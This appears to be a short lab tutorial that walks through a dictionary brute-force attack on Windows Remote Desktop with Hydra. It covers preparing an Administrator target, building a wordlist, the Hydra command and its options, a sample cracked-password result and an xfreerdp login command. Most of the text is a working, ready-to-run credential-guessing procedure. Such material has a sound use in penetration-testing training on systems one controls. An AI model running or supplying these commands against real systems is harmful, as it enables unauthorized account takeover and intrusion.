# Hydra RDP Attack (Dictionary Brute Force)

## Description

Use Hydra to perform a dictionary-based brute force attack against Windows Remote Desktop (RDP).

Protocol: RDP
Default Port: 3389
Target User: Administrator

---

## Prepare Windows Target

Enable Remote Desktop:

```
Start → System → Remote Desktop → Enable Remote Desktop
```

Allow Administrator access:

```
Select users that can remotely access this PC → Add → Administrator
```

Verify RDP port:

```
3389
```

---

## Password List

Create password list:

```bash
nano passwords.txt
```

Example wordlist:

```text
princess
1234567
rockyou
12345678
abc123
nicole
daniel
monkey
lovely
jessica
654321
michael
ashley
qwerty
Password.1**
iloveu
michelle
tigger
sunshine
chocolate
```

---

## Install Hydra

```bash
sudo apt update
sudo apt install hydra
```

---

## Hydra Command

```bash
hydra -l Administrator -P ~/passwords.txt -t 4 -V rdp://10.0.*.*
```

---
<img width="1529" height="549" alt="image" src="https://github.com/user-attachments/assets/61af8dc8-9d98-4a8a-9f99-cb428fa6db5b" />

## Parameters

| Option   | Meaning              |
| -------- | -------------------- |
| -l       | username             |
| -P       | password list        |
| -t 4     | parallel connections |
| -V       | verbose output       |
| rdp://   | protocol             |
| 10.0.*.* | target IP            |

---

## Example Success Output

```
[3389][rdp] host: 10.0.2.6   login: Administrator   password: Password.1**
```

---

## Notes

Common issues:

* RDP not enabled
* Port 3389 blocked in firewall or security group
* Account lockout policy triggered
* Incorrect IP address

---

## Related Tools

xfreerdp command example:

```bash
xfreerdp /u:Administrator /p:Password.1** /v:10.0.*.*
```

